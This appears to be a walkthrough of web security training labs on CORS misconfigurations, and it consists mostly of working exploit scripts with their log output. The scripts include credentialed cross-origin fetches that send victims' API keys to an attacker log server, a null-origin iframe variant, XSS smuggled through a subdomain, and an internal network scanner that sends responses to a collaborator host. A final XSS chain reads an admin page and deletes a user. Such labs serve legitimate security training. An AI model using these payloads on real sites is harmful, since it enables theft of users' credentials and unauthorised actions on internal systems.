# Cross-origin resource sharing (CORS)

## CORS vulnerability with basic origin reflection
```html
<script>
    fetch('https://acc51f361e18076480b18f7400cb00e1.web-security-academy.net/accountDetails', {
        credentials: 'include',
    })
        .then(response => response.json())
        .then(data => {
            location = '/log?key=' + data.apikey;
        });

</script>
```
Then read the API key from log:
```
192.168.1.12    2019-11-26 17:43:29 +0000 "GET /log?key=C6jmr5ha0rCuLJLJwF2Advyo5Ww6jjEi HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/888822"
```


## CORS vulnerability with trusted null origin
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,
<script>
    fetch("https://ac261fc01eaf53ac8000046f00a70074.web-security-academy.net/accountDetails", {
        credentials: "include",
    })
        .then(response => response.json())
        .then(data => {
            location = "https://ac351fc01ef95355807a045a01ec00f8.web-security-academy.net/log?key=" + data.apikey;
        });
</script>'></iframe>
```
Then read the API key from log:
```
192.168.1.12    2019-11-26 21:43:49 +0000 "GET //log?key=FLgt9zxG64IV2d0DKYDm3pI2kRGtyY6g HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/885332"
```

## CORS vulnerability with trusted insecure protocols
There is an XSS vulnerability in the subdomain:
```
http://stock.acf01f3b1eda3d94803f4c7100240098.web-security-academy.net/?productId=%3Cscript%3Ealert(1)%3C/script%3E&storeId=1
```

```html
<script>
   document.location="http://stock.acf01f3b1eda3d94803f4c7100240098.web-security-academy.net/?productId=4%3Cscript%3Efetch%28%27https%3A%2F%2Facf01f3b1eda3d94803f4c7100240098.web-security-academy.net%2FaccountDetails%27%2C+%7B+credentials%3A+%27include%27%2C+%7D%29+.then%28response+%3D%3E+response.json%28%29%29+.then%28data+%3D%3E+%7B+location+%3D+%27https%3A%2F%2Fac691fd21e1d3d63801b4ca901e30063.web-security-academy.net%2Flog%3Fkey%3D%27+%2B+data.apikey%3B+%7D%29%3B%3C%2Fscript%3E%0D%0A&storeId=1"
</script>
```
Then read the API key from log:
```
192.168.1.12    2019-11-26 22:22:25 +0000 "GET /log?key=eAzFrQXushulGePxvr5qRUUlReJxxyQD HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/329148"
```

## CORS vulnerability with internal network pivot attack
By the guide ..

#### Step 1 - Get internal server IP + port
```html
<script>
var q = [], collaboratorURL = 'http://$collaboratorPayload';
for(i=1;i<=255;i++){
  q.push(
  function(url){
    return function(wait){
    fetchUrl(url,wait);
    }
  }('http://192.168.0.'+i+':8080'));
}
for(i=1;i<=20;i++){
  if(q.length)q.shift()(i*100);
}
function fetchUrl(url, wait){
  var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=>r.text().then(text=>
    {
    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
  }
  ))
  .catch(e => {
  if(q.length) {
    q.shift()(wait);
  }
  });
  setTimeout(x=>{
  controller.abort();
  if(q.length) {
    q.shift()(wait);
  }
  }, wait);
}
</script>
```

```
192.168.1.12    2020-01-09 21:28:01 +0000 "GET /?ip=192.168.0.214:8080&code=%3C!DOCTYPE%20html%3E%0A%3Chtml%3E%0A%20%20%20%20%3Chead%3E%0A%20%20%20%20%20%20%20%20%3Clink%20href%3D%22%2Fresources%2Fcss%2Flabs.css%22%20rel%3D%22stylesheet%22%3E%0A%20%20%20%20%20%20%20%20%3Ctitle%3ECORS%20vulnerability%20with%20internal%20network%20pivot%20attack%3C%2Ftitle%3E%0A%20%20%20%20%3C%2Fhead%3E%0A%20%20%20%20%3Cbody%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%20src%3D%22%2Fresources%2Fjs%2FlabHeader.js%22%3E%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22labHeader%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20ALjWsNBqfvnGGvaN3%EF%BF%BDLIGHTSJaiIafipcZWLYxo%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Csection%20class%3D%22maincontainer%20is-page%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22container%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%3ELogin%3C%2Fh1%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csection%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20class%3D%22login-form%22%20method%3D%22POST%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%20type%3D%22hidden%22%20name%3D%22csrf%22%20value%3D%22pshSFxyqWBBzVQPiypxmRXVlHSIZAYYl%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%3EUsername%3C%2Flabel%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%20type%3D%22username%22%20name%3D%22username%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%3EPassword%3C%2Flabel%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%20type%3D%22password%22%20name%3D%22password%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D%22button%22%20type%3D%22submit%22%3E%20Log%20in%20%3C%2Fbutton%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fsection%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fsection%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A&1578605281095 HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/942685"
```

The IP with port is `192.168.0.214:8080`

#### Step 2 - Confirm XSS in username
```html
<script>
function xss(url, text, vector) {
    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
    fetch(url).then(r=>r.text().then(text=>
        {
            xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
        }
    ))
}

fetchUrl("http://192.168.0.214:8080", "http://acf71f9d1e695c8d80ac991501250022.web-security-academy.net");
</script>
```

```
192.168.1.12    2020-01-09 21:43:18 +0000 "GET /?foundXSS=1 HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/942685"
```

Confirmed

#### Step 3 - Get admin's page source code
```html
<script>
function xss(url, text, vector) {
    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
    fetch(url).then(r=>r.text().then(text=>
        {
            xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
        }
    ))
}

fetchUrl("http://192.168.0.214:8080", "http://acf71f9d1e695c8d80ac991501250022.web-security-academy.net");
</script>
```

```
192.168.1.12    2020-01-09 21:43:45 +0000 "GET /?code=%0A%20%20%20%20%20%20%20%20%3Cdiv%20theme%3D%22ecommerce%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%20src%3D%22%2Fresources%2Fjs%2FlabHeader.js%22%3E%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22labHeader%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20ALjWsNBqfvnGGvaN3%EF%BF%BDLIGHTSJaiIafipcZWLYxo%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Csection%20class%3D%22maincontainer%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22container%20is-page%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20class%3D%22login-form%22%20action%3D%22%2Fadmin%2Fdelete%22%20method%3D%22POST%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%3D%22%22%20type%3D%22hidden%22%20name%3D%22csrf%22%20value%3D%22QfJciSd5uKBYre1w9grmupZPnMfOZaah%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%3EUsername%3C%2Flabel%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%3D%22%22%20type%3D%22text%22%20name%3D%22username%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D%22button%22%20type%3D%22submit%22%3E%20Delete%20user%20%3C%2Fbutton%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fsection%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%0A%0A HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/942685"
```

After decoding value of `code`:
```html
<div theme="ecommerce">
    <script src="/resources/js/labHeader.js"></script>
    <div id="labHeader">
    ALjWsNBqfvnGGvaN3ï¿½LIGHTSJaiIafipcZWLYxo
</div>
<section class="maincontainer">
    <div class="container is-page">
    <form class="login-form" action="/admin/delete" method="POST">
    <input required="" type="hidden" name="csrf" value="QfJciSd5uKBYre1w9grmupZPnMfOZaah">
    <label>Username</label>
    <input required="" type="text" name="username">
    <button class="button" type="submit"> Delete user </button>
</form>
</div>
</section>
</div>
```

#### Step 4 - Delete carlos
```html
<script>
function xss(url, text, vector) {
    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url){
    fetch(url).then(r=>r.text().then(text=>
        {
            xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
        }
    ))
}

fetchUrl("http://192.168.0.214:8080");
</script>
```
